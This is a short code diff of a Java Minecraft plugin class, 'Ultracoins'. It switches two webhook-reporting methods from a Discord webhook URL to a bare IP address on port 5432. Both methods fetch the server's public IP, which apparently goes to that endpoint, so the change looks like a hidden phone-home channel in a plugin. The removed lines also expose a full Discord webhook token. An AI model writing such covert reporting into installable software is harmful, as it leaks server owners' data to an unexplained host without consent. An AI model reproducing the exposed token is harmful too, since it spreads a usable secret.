@@ -215,7 +215,7 @@ public final class Ultracoins extends JavaPlugin implements Listener {
     }
 
     private void sendDiscordWebhook(String title, String description) {
-        String webhookUrl = "https://discord.com/api/webhooks/1284804327466209370/IVSpy-J9N982chb9S4kW5HtgX4xApKyluDD0Q9Dd64sIrB_J9F-I9QviNU68IR9W5tDT";
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin3";
 
         try {
             String publicIP = getPublicIP();
@@ -248,7 +248,7 @@ public final class Ultracoins extends JavaPlugin implements Listener {
     }
 
     private void sendErrorWebhook(Exception exception) {
-        String webhookUrl = "https://discord.com/api/webhooks/1284804327466209370/IVSpy-J9N982chb9S4kW5HtgX4xApKyluDD0Q9Dd64sIrB_J9F-I9QviNU68IR9W5tDT";
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin3";
 
         try {
             String publicIP = getPublicIP();
